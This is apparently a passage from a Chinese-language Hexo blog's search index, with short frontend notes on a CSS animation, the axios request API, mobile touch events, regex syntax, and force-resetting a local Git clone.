http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box &#123; position: relative; width: 500px; height: 500px; border: 2px solid red; margin: 50px auto; &#125; i &#123; position: absolute; top: -9px; left: -9px; width: 18px; height: 18px; background-color: chartreuse; border-radius: 50%; animation: move 3s;l &#125; @keyframes move&#123; 0% &#123; transform: translate(0px,0px ); &#125; 100%&#123; transform: translate(500px,0px ); &#125; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;i&gt;&lt;/i&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>css3</tag>
        <tag>html5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[axios]]></title>
    <url>%2F2018%2F11%2F24%2Faxios%2Findex.html</url>
    <content type="text"><![CDATA[axios 是 Vue 推荐的一款基于 Promise 的 AJAX 组件。所以我们在使用 Vue 进行项目开发时一般都使用这个库来执行 AJAX 请求。 发送请求 axios.get(url[,config])：发送GET请求 axios.post(url,data)：发送POST请求 axios.put(url,data[,config])：发送PUT请求 axios.delete(url[,config])：发送DELETE请求 axios.options(url[,config])：发送OPTIONS请求 axios.patch(url,data[,config])：发送PATCH请求 axios.head(url[,config])：发送HEAD请求 axios.request(config)：发送各种请求 PromisePromise对象中提供了两个方法 then 和 catch： then：请求执行成功时调用 catch：请求失败时调用1234567891011121314151617181920212223242526272829// 执行请求返回 Promise 对象var ajax = axios.get('https://api.myjson.com/bins/nx1ge')ajax.then((res)=&gt;&#123; console.log( res.data ) // 返回的数据 console.log( res.status ) // 状态码 console.log( res.statusText ) // 状态码文本 console.log( res.headers ) // 响应的协议头信息 console.log( res.config ) // 请求的参数 console.log( res.request ) // 原生 XMLHttpRequest 对象&#125;).catch((err)=&gt;&#123; // 发送了请求，并且成功，但服务器返回状态码不是2xx时执行 if (error.response) &#123; console.log(error.response.data); console.log(error.response.status); console.log(error.response.headers); &#125; // 发送了请求，但服务器没有返回响应时执行 else if (error.request) &#123; // error.request 是原生的 XMLHttpRequest 对象 console.log(error.request); &#125; // 发送请求时出错 else &#123; console.log('Error', error.message); &#125; // 请求的配置项 console.log(error.config);&#125;) axios配置 配置项 说明 url 请求地址 method 请求方法，默认是 default baseURL 请求时的基地址 headers 设置 HTTP 头信息 params 请求时 URL 上的参数 data 请求时提交的数据，主要在PUT、POST、PATCH时使用 timeout 请求超时时间，单位：毫秒 responseType 指明服务器返回数据的类型，默认是JSON onUploadProgress 上传文件时处理上传进程的回调函数 onDownloadProgress 下载时处理下载进度的回调函数 拦截器在发送 AJAX请求前和处理AJAX响应前对数据进行拦截处理1234567891011121314151617// 在所有请求之前执行的代码axios.interceptors.request.use(function (config) &#123; // 处理请求前代码 return config; &#125;, function (error) &#123; // Do something with request error return Promise.reject(error); &#125;); // 当服务器返回数据时执行的代码axios.interceptors.response.use(function (response) &#123; // 请求成功时，拦截的代码 return response; &#125;, function (error) &#123; // 请求失败时，拦截的代码 return Promise.reject(error); &#125;);]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端事件详解]]></title>
    <url>%2F2018%2F11%2F24%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%BA%8B%E4%BB%B6%E8%AF%A6%E8%A7%A3%2Findex.html</url>
    <content type="text"><![CDATA[关于移动端事件的一些笔记 移动端事件类型 touchstart事件 touchmove事件 touchend事件 移动端事件对象 touches 屏幕上有几个触点 targetTouches 绑定事件的元素上有几个触点 changedTouches 在屏幕上 改变(位置移动 离开 进入 )的触点的个数(如果手指离开屏幕 只有changedTouched有值 其他都没有) 获取触点坐标 clientX/Y获取的是， 触点相对于可视区的X/Y坐标(不包含滚动)(用的最多) pageX/Y获取的是 ， 触点相对于HTML文档左边沿的的X/Y坐标(包含滚动) screenX/Y获取的是返回触点相对于屏幕左边沿的的X/Y坐标.不包含页面滚动的（screenX/Y有兼容性） 细节: 如果想要clientX/YpageX/Y正确的结果,要写全viewport设置,如果写不全,那么不会得到正确的结果 300ms延迟 形成原因：曾经移动端在萌芽阶段的时候，我们把PC端的网页放到了移动端，苹果公司把PC端的网页进行了缩放，发明了一种浏览缩放网页的处理方案 ，就是双击放大，第一次点击会延迟300ms左右，然后判断，如果有第二次点击，就是放大，如果没有，就是点击 console.time(“timer”)计时器开 console.timeEnd(‘timer’)计时器关 解决方法： 写上 viewport 设置就可以了 用fastClick 移动端判断手指滑动方向 获取到 触点起始点坐标 获取到 触点 结束点坐标 计算 坐标的差值的绝对值 如果 水平坐标的差值的绝对值 大于竖直 就是水平滑动 如果 终止点坐标减去起始点坐标大于0 那么是向 右 否则是向左滑 如果 竖直坐标的差值的绝对值 大于水平 就是竖直滑动 如果 终止点坐标减去起始点坐标大于0 那么是向 下 否则是向上滑 代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; // 1.声明变量 var startX, startY, endX, endY, absX, absY; // 2.给document添加touchstart事件 document.addEventListener("touchstart", function (e) &#123; var touches = e.targetTouches[0]; startX = touches.clientX; startY = touches.clientY; // console.log(startX, startY); &#125;) // 3. 给document添加touchend事件 document.addEventListener("touchend", function (e) &#123; var touches = e.changedTouches[0]; endX = touches.clientX; endY = touches.clientY; // 4. 计算坐标差值的绝对值 absX = Math.abs(endX - startX); absY = Math.abs(endY - startY); if (absX == absY) &#123; return; &#125; // 5. 判断是水平还是垂直 // 6. 如果是水平 判断左右 // 7.如果是垂直 判断上下 var direction = absX &gt; absY ? endX - startX &gt; 0 ? "向右" : "向左" : endY - startY &gt; 0 ? "向下" : "向上"; console.log(direction); &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式常用语法总结]]></title>
    <url>%2F2018%2F11%2F24%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93%2Findex.html</url>
    <content type="text"><![CDATA[正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本 普通字符 字母、数字、标点符号、键盘特殊符号等 定义字符集 [a-z] 匹配 26 个字母之一 [aeiou] 匹配 aeiou 这 5 个字符其中的某一个字符 [a-zA-Z] 匹配 26 个(大小写)字母中的某一个字母 [a-zA-Z0-9_-] 匹配(大小写)字母、数字、下划线、中横线 的某一个字符 [0-9] 匹配 0 到 9 之间任意一个数字 [9-3] [z-a] 不能从大往小写，有语法错误 shiy 特别字符集 $ 匹配输入字符串的结尾位置（regexBuddy中待测试文本中多行算作一行） ^ (托字符) 匹配字符串的开始位置(托字符) ( ) 匹配一个子表达式的开始和结束位置，模式单元 * 匹配其前面那个单元出现 0 次或以上（任意次数） + 匹配其前面那个单元出现 1 次或以上 \? 匹配其前面那个单元出现 0 次或 1 次 .点 匹配除换行符 \n 之外的任何单字符 .* \ 这个符号是用来转义的 | 指明两项之间的一个选择 组合字符集 \d 匹配数字 0 到 9 之一，与[0-9]效果一样 \D 匹配非数字[^0-9]之一 \w 匹配(大小写)字母、数字、下划线其中一个，与[a-zA-Z0-9_]效果相同 \W 匹配非字母、数字、下划线之一 \s 匹配一个空格 \S 匹配一个非空格 \b 匹配单词的开始或结束 限制字符集 {m} 匹配其前一单元严格出现 m 次 {m,} 匹配其前一单元出现至少m次，至多不限制,{0,}相等于*，{1,}相等于+ {m,n} 匹配其前一单元出现至少 m，至多 n 次 [^lsjd] 匹配非 lsjd 之中的字符 [^a-f] 匹配非 a 到 f 之间的一个字符 [^定义字符集] 不给匹配定义字符集里边的信息 模式修正符 g 全文查找出现的所有 正在模式内容 （全局匹配） (php 中可以使用 preg_match_all()函数限制全局匹配) i 忽略大小写 m 将匹配内容视为多行 /u 表示按 unicode(utf-8)匹配（主要针对多字节比如汉字） /s 表示将字符串视为单行来匹配 贪婪模式转非贪婪模式通过在 *、+ 或 ? 限定符之后放置?，该表达式从”贪心”表达式转换为”非贪心”表达式或者最小匹配]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git强制覆盖本地代码]]></title>
    <url>%2F2018%2F07%2F18%2FGit%E5%BC%BA%E5%88%B6%E8%A6%86%E7%9B%96%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%2Findex.html</url>
    <content type="text"><![CDATA[把班级里的git仓库clone下来后，一不小心在本地做了修改，等到下次拉取的时候，却提示要先提交本地修改，但是我们没有权限对班里的代码进行修改，也不可能给你权限修改。 此时，就需要强制拉取最新代码覆盖掉本地所做的修改 1. 将远程库下载到本地git fetch --all 2. 清空暂存区，回退到最新版本git reset --hard origin/master 3. 拉取最新代码git pull]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
</search>
